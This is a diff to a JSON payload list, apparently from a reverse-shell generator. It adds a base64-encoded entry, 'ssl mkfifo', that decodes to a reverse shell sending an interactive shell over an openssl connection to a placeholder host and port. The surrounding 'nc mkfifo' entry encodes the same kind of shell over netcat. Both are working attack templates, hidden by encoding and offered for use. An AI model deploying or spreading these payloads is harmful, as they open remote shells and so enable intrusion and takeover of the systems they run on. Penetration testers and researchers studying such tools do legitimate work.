@@ -34,6 +34,13 @@
             "mac"
         ]
     },
+    "ssl mkfifo": {
+        "command": "bWtmaWZvIGZpZm87IHtzaGVsbH0gLWkgPCBmaWZvIDI+JjEgfCBvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCB7aXB9Ontwb3J0fSA+IGZpZm87IHJtIGZpZm8=",
+        "meta": [
+            "linux",
+            "mac"
+        ]
+    },
     "nc mkfifo": {
         "command": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx7c2hlbGx9IC1pIDI+JjF8bmMge2lwfSB7cG9ydH0gPi90bXAvZg==",
         "meta": [
